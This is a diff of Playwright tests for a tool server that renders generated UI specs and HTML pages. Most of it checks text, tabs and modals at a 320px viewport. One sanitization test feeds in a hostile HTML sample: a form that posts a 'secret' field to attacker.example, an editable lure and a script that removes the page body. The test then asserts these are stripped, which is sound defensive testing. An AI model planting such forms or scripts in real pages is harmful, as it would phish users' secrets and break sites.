@@ -141,6 +141,130 @@ test('demo dashboard keeps every metric and chart bar visible at desktop and mob
   }
 });
 
+test('generated text stays within a 320px viewport for long identifiers and CJK copy', async ({
+  page,
+}) => {
+  const longIdentifier = `RELEASE_CANDIDATE_${'A'.repeat(96)}`;
+  const cjkCopy =
+    'これは読みやすく自然に改行される日本語の文章です。这个中文句子应该自然换行而不溢出屏幕。';
+  const spec = [
+    {
+      version: 'v0.9',
+      createSurface: {
+        surfaceId: 'narrow-text',
+        catalogId: 'https://a2ui.org/specification/v0_9/basic_catalog.json',
+      },
+    },
+    {
+      version: 'v0.9',
+      updateComponents: {
+        surfaceId: 'narrow-text',
+        components: [
+          { id: 'root', component: 'Column', children: ['identifier', 'cjk'] },
+          { id: 'identifier', component: 'Text', text: longIdentifier },
+          { id: 'cjk', component: 'Text', text: cjkCopy },
+        ],
+      },
+    },
+  ];
+  const client = await connectStdioClient();
+  try {
+    const created = createdPageSchema.parse(
+      await client.callTool({ name: 'show_ui', arguments: { spec } }),
+    );
+    await page.setViewportSize({ width: 320, height: 720 });
+    await page.goto(created.structuredContent.url);
+    await expect(page.getByText(longIdentifier)).toBeVisible();
+    await expect(page.getByText(cjkCopy)).toBeVisible();
+
+    const layout = await page.evaluate(() => ({
+      viewportWidth: window.innerWidth,
+      documentWidth: document.documentElement.scrollWidth,
+    }));
+    expect(layout.documentWidth).toBeLessThanOrEqual(layout.viewportWidth);
+
+    for (const text of [longIdentifier, cjkCopy]) {
+      const box = await page.getByText(text).boundingBox();
+      expect(box).not.toBeNull();
+      expect(box!.x).toBeGreaterThanOrEqual(0);
+      expect(box!.x + box!.width).toBeLessThanOrEqual(layout.viewportWidth);
+    }
+  } finally {
+    await client.close();
+  }
+});
+
+test('generated tabs and modal fit a 320px viewport', async ({ page }) => {
+  const longTabTitle = `ACCOUNT_${'SETTINGS_'.repeat(12)}`;
+  const spec = [
+    {
+      version: 'v0.9',
+      createSurface: {
+        surfaceId: 'narrow-components',
+        catalogId: 'https://a2ui.org/specification/v0_9/basic_catalog.json',
+      },
+    },
+    {
+      version: 'v0.9',
+      updateComponents: {
+        surfaceId: 'narrow-components',
+        components: [
+          { id: 'root', component: 'Column', children: ['tabs', 'modal'] },
+          {
+            id: 'tabs',
+            component: 'Tabs',
+            tabs: [
+              { title: longTabTitle, child: 'first-panel' },
+              { title: 'Notifications', child: 'second-panel' },
+            ],
+          },
+          { id: 'first-panel', component: 'Text', text: 'Account settings' },
+          { id: 'second-panel', component: 'Text', text: 'Notification settings' },
+          { id: 'modal', component: 'Modal', trigger: 'open-modal', content: 'modal-content' },
+          { id: 'open-modal', component: 'Button', child: 'open-modal-label' },
+          { id: 'open-modal-label', component: 'Text', text: 'Open narrow modal' },
+          {
+            id: 'modal-content',
+            component: 'Text',
+            text: `DETAIL_${'WITHOUT_BREAKS_'.repeat(12)}`,
+          },
+        ],
+      },
+    },
+  ];
+  const client = await connectStdioClient();
+  try {
+    const created = createdPageSchema.parse(
+      await client.callTool({ name: 'show_ui', arguments: { spec } }),
+    );
+    await page.setViewportSize({ width: 320, height: 720 });
+    await page.goto(created.structuredContent.url);
+
+    const longTab = page.getByRole('button', { name: longTabTitle });
+    await expect(longTab).toBeVisible();
+    const tabBox = await longTab.boundingBox();
+    expect(tabBox).not.toBeNull();
+    expect(tabBox!.x).toBeGreaterThanOrEqual(0);
+    expect(tabBox!.x + tabBox!.width).toBeLessThanOrEqual(320);
+
+    await page.getByRole('button', { name: 'Open narrow modal' }).click();
+    const dialog = page.locator('a2ui-modal dialog');
+    await expect(dialog).toBeVisible();
+    const dialogBox = await dialog.boundingBox();
+    expect(dialogBox).not.toBeNull();
+    expect(dialogBox!.x).toBeGreaterThanOrEqual(0);
+    expect(dialogBox!.x + dialogBox!.width).toBeLessThanOrEqual(320);
+
+    const layout = await page.evaluate(() => ({
+      viewportWidth: window.innerWidth,
+      documentWidth: document.documentElement.scrollWidth,
+    }));
+    expect(layout.documentWidth).toBeLessThanOrEqual(layout.viewportWidth);
+  } finally {
+    await client.close();
+  }
+});
+
 test('stdio MCP creates a page, the browser submits it, and the agent receives it', async ({
   page,
 }) => {
@@ -209,7 +333,7 @@ test('stdio MCP serves a sanitized view-only HTML page', async ({ page }) => {
       await client.callTool({
         name: 'show_html',
         arguments: {
-          html: '<main><h1>Live production view</h1><script>document.body.remove()</script></main>',
+          html: '<main><h1>Live production view</h1><form action="https://attacker.example/collect"><label>Secret <input name="secret"></label><button>Send</button></form><div contenteditable="true">Editable lure</div><script>document.body.remove()</script></main>',
         },
       }),
     );
@@ -221,6 +345,9 @@ test('stdio MCP serves a sanitized view-only HTML page', async ({ page }) => {
       iframe.contentFrame().getByRole('heading', { name: 'Live production view' }),
     ).toBeVisible();
     expect(await iframe.contentFrame().locator('script').count()).toBe(0);
+    expect(
+      await iframe.contentFrame().locator('form, input, button, [contenteditable]').count(),
+    ).toBe(0);
 
     const result = resultSchema.parse(
       await client.callTool({
